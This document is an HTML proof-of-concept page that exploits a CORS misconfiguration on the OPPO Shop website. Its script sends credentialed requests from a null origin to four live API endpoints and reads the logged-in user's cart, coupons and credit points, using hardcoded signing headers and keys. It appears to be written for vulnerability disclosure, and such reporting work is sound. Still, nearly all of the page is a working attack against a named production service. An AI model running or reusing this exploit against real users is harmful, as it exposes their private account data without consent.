<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="UTF-8">
<title>OPPO CORS Exploit PoC</title>

<style>

body{
font-family: Arial, sans-serif;
background:#eef2f7;
margin:0;
padding:30px;
color:#222;
}

.container{
max-width:1100px;
margin:auto;
}

h1{
text-align:center;
margin-bottom:10px;
}

.description{
text-align:center;
font-size:16px;
margin-bottom:30px;
color:#444;
}

button{
display:block;
margin:0 auto 30px auto;
padding:12px 30px;
font-size:16px;
background:#2e7df6;
color:white;
border:none;
border-radius:6px;
cursor:pointer;
}

button:hover{
background:#1c5ed3;
}

.grid{
display:grid;
grid-template-columns:1fr;
gap:20px;
}

.card{
background:white;
padding:18px;
border-radius:10px;
box-shadow:0 2px 8px rgba(0,0,0,0.08);
}

.label{
display:inline-block;
padding:5px 12px;
border-radius:6px;
font-size:13px;
color:white;
margin-bottom:10px;
}

.cart{background:#4CAF50;}
.count{background:#2196F3;}
.coupon{background:#FF9800;}
.credit{background:#9C27B0;}

.url{
font-size:14px;
color:#555;
margin-bottom:8px;
word-break:break-word;
}

.status{
font-weight:bold;
margin-bottom:8px;
}

pre{
background:#f5f6f8;
padding:12px;
border-radius:6px;
white-space:pre-wrap;
word-wrap:break-word;
overflow-wrap:break-word;
font-size:13px;
line-height:1.4;
}

</style>

</head>

<body>

<div class="container">

<h1>OPPO CORS Exploit Proof of Concept</h1>

<div class="description">
This PoC demonstrates a CORS misconfiguration allowing authenticated requests to OPPO Shop APIs when opened from a <b>null origin (file://)</b>.
</div>

<button onclick="runExploit()">Run Exploit</button>

<div class="grid" id="results"></div>

</div>

<script>

const customHeaders = {
"Content-Type":"application/json;charset=UTF-8",
"x-web-client-type":"mobile",
"x-sign":"3HVUaCnfKgkv96/vKFDQ1uj2KC8=",
"x-requesttime":"1772758692830",
"x-sign-key":"4iAEb620alQ8s8c8ss8o0K8sS",
"x-biz-appkey":"TZeSXfQXxrCyjhvARaVrmw",
"x-app-deviceid":"52c4b8449f2f5509808568b8d7f917e9",
"disableenvelope":"true"
};

function createCard(title,label,url){

let card=document.createElement("div")
card.className="card"

card.innerHTML =
'<div class="label '+label+'">'+title+'</div>'+
'<div class="url">'+url+'</div>'+
'<div class="status" id="'+label+'_status">Waiting for request...</div>'+
'<pre id="'+label+'_data"></pre>'

document.getElementById("results").appendChild(card)

}

createCard(
"Cart List (Authenticated Data)",
"cart",
"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list"
)

createCard(
"Cart Count",
"count",
"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount"
)

createCard(
"Coupon Count (Unused Coupons)",
"coupon",
"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1"
)

createCard(
"User Credits / Points",
"credit",
"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit"
)

function request(url,label){

fetch(url,{
method:"GET",
credentials:"include",
headers: customHeaders
})

.then(r=>{
document.getElementById(label+"_status").innerText="STATUS: "+r.status
return r.text()
})

.then(data=>{
document.getElementById(label+"_data").innerText=data
})

.catch(err=>{
document.getElementById(label+"_data").innerText=err
})

}

function runExploit(){

request(
"https://www.opposhop.cn/cn/oapi/orders/web/cart/v1/list",
"cart"
)

request(
"https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",
"count"
)

request(
"https://www.opposhop.cn/cn/oapi/users/web/coupons/count?state=1",
"coupon"
)

request(
"https://www.opposhop.cn/cn/oapi/users/web/credits/getUserCredit",
"credit"
)

}

</script>

</body>
</html>
